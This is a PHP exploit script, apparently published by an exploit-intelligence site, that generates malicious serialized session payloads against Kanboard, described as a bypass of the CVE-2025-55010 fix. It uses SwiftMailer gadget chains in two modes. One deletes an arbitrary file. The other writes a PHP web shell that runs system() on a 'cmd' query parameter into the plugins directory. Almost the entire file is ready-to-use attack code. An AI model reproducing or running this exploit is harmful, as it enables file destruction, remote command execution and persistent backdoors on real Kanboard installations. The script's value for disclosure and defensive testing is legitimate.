<?php
// ──────────────────────────────────────────────────────────────────────
// Exploit Title  : Kanboard Session Bypass Payload Generator
// CVE            : CVE-2025-55010
// Vendor         : Kanboard
// Product        : Kanboard
// Author         : Exploit Intelligence Platform (dev@exploit-intel.com)
// Website        : https://exploit-intel.com
// Twitter        : @exploit_intel
// Date           : 2026-02-27
//
// For authorized security testing and educational purposes only.
// ──────────────────────────────────────────────────────────────────────
/**
 * CVE-2025-55010 Bypass — Session Table Deserialization Payload Generator
 *
 * This script generates a malicious PHP session payload that exploits
 * the unsafe deserialization in PHP's session handling when Kanboard
 * uses database-backed sessions (SESSION_HANDLER='db', which is the default).
 *
 * The fix for CVE-2025-55010 only patches ProjectActivityEventFormatter::unserializeEvent().
 * It does NOT address the fact that PHP's session_start() also calls unserialize()
 * on data from the `sessions` database table — using the same attack vector
 * (admin DB download/upload).
 *
 * Usage: php generate_session_payload.php <mode> [marker_string]
 *   mode: "filedelete" — TemporaryFileByteStream __destruct() file deletion
 *         "filewrite"  — SimpleMimeEntity + DiskKeyCache file write via __toString()
 *
 * Output: PHP-serialized session data in the 'php' session serialize format
 */

// Autoload SwiftMailer classes
require_once '/var/www/app/vendor/autoload.php';

$mode = $argv[1] ?? 'filedelete';
$marker = $argv[2] ?? 'CVE-2025-55010-SESSION-BYPASS-' . bin2hex(random_bytes(8));

if ($mode === 'filedelete') {
    // ======================================================================
    // Mode: File Deletion via TemporaryFileByteStream::__destruct()
    // ======================================================================
    // When PHP deserializes the session data, it instantiates the
    // TemporaryFileByteStream object. At the end of the request,
    // __destruct() calls unlink($this->_path) — deleting any file
    // accessible to the web server user.
    //
    // We target /tmp/bypass_marker.txt as a safe proof file.
    // ======================================================================

    $target_file = '/tmp/bypass_marker.txt';

    // Create TemporaryFileByteStream with controlled _path
    // _path is a private property of Swift_ByteStream_FileByteStream
    // We need to use PHP Reflection to set it, then serialize
    $obj = (new ReflectionClass('Swift_ByteStream_TemporaryFileByteStream'))
        ->newInstanceWithoutConstructor();

    $pathProp = new ReflectionProperty('Swift_ByteStream_FileByteStream', '_path');
    $pathProp->setAccessible(true);
    $pathProp->setValue($obj, $target_file);

    // PHP session format: key|serialized_value
    // Use 'php' session serialize handler format
    $serialized_obj = serialize($obj);
    $session_data = 'bypass|' . $serialized_obj;

    // Output info
    fwrite(STDERR, "Mode: filedelete\n");
    fwrite(STDERR, "Target file: $target_file\n");
    fwrite(STDERR, "Marker: $marker\n");
    fwrite(STDERR, "Session data length: " . strlen($session_data) . "\n");
    fwrite(STDERR, "Gadget: Swift_ByteStream_TemporaryFileByteStream::__destruct() -> unlink()\n");

    echo $session_data;

} elseif ($mode === 'filewrite') {
    // ======================================================================
    // Mode: File Write via SimpleMimeEntity + DiskKeyCache
    // ======================================================================
    // This uses the SAME gadget chain as the original CVE, but triggered
    // via __toString() instead. We store the SimpleMimeEntity in the session
    // and then need __toString() to be triggered.
    //
    // For demonstration: this payload can be combined with triggering
    // __toString() through application code that accesses session data
    // in a string context. The __destruct() of SimpleMimeEntity alone
    // only calls clearAll() (file deletion).
    //
    // However, we can also use a DIFFERENT approach: store the SimpleMimeEntity
    // as a session variable that the application will try to use as a string.
    // ======================================================================

    $target_dir = '/var/www/app/plugins';
    $cache_key = 'session_bypass_' . bin2hex(random_bytes(4));
    $body_content = "<?php /* $marker */ if(isset(\$_GET['cmd'])) { system(\$_GET['cmd']); } ?>";

    // Build the DiskKeyCache for file writing
    $stream = (new ReflectionClass('Swift_ByteStream_FileByteStream'))
        ->newInstanceWithoutConstructor();

    $cache = (new ReflectionClass('Swift_KeyCache_DiskKeyCache'))
        ->newInstanceWithoutConstructor();

    // Set DiskKeyCache private properties
    $ref = new ReflectionClass('Swift_KeyCache_DiskKeyCache');
    $pathProp = $ref->getProperty('_path');
    $pathProp->setAccessible(true);
    $pathProp->setValue($cache, $target_dir);

    $keysProp = $ref->getProperty('_keys');
    $keysProp->setAccessible(true);
    $keysProp->setValue($cache, []);

    $quotesProp = $ref->getProperty('_quotes');
    $quotesProp->setAccessible(true);
    $quotesProp->setValue($cache, false);

    // Build the encoder (passthrough)
    $encoder = new Swift_Mime_ContentEncoder_RawContentEncoder();

    // Build empty headers
    $factory = (new ReflectionClass('Swift_Mime_SimpleHeaderFactory'))
        ->newInstanceWithoutConstructor();
    $headerSet = (new ReflectionClass('Swift_Mime_SimpleHeaderSet'))
        ->newInstanceWithoutConstructor();

    $hsRef = new ReflectionClass('Swift_Mime_SimpleHeaderSet');
    $hsProp = $hsRef->getProperty('_headers');
    $hsProp->setAccessible(true);
    $hsProp->setValue($headerSet, []);
    $hsOrder = $hsRef->getProperty('_order');
    $hsOrder->setAccessible(true);
    $hsOrder->setValue($headerSet, []);
    $hsRequired = $hsRef->getProperty('_required');
    $hsRequired->setAccessible(true);
    $hsRequired->setValue($headerSet, []);
    $hsCharset = $hsRef->getProperty('_charset');
    $hsCharset->setAccessible(true);
    $hsCharset->setValue($headerSet, 'utf-8');

    // Build grammar
    $grammar = new Swift_Mime_Grammar();

    // Build the SimpleMimeEntity
    $entity = (new ReflectionClass('Swift_Mime_SimpleMimeEntity'))
        ->newInstanceWithoutConstructor();

    $eRef = new ReflectionClass('Swift_Mime_SimpleMimeEntity');

    $props = [
        '_headers' => $headerSet,
        '_body' => $body_content,
        '_encoder' => $encoder,
        '_cache' => $cache,
        '_cacheKey' => $cache_key,
        '_immediateChildren' => [],
        '_grammar' => $grammar,
        '_maxLineLength' => 0,
        '_children' => [],
        '_compositeRanges' => [],
        '_compoundLevelFilters' => [],
        '_nestingLevel' => 0,
        '_id' => 'bypass@poc',
        '_userContentType' => 'text/plain',
    ];

    foreach ($props as $name => $value) {
        $prop = $eRef->getProperty($name);
        $prop->setAccessible(true);
        $prop->setValue($entity, $value);
    }

    // Session data in 'php' serialize format
    $serialized_entity = serialize($entity);
    $session_data = 'bypass|' . $serialized_entity;

    fwrite(STDERR, "Mode: filewrite\n");
    fwrite(STDERR, "Target: $target_dir/$cache_key/body\n");
    fwrite(STDERR, "Marker: $marker\n");
    fwrite(STDERR, "Cache key: $cache_key\n");
    fwrite(STDERR, "Session data length: " . strlen($session_data) . "\n");
    fwrite(STDERR, "Gadget: SimpleMimeEntity -> DiskKeyCache file write\n");
    fwrite(STDERR, "Note: __toString() trigger needed for file write; __destruct() alone does clearAll()\n");

    echo $session_data;
}
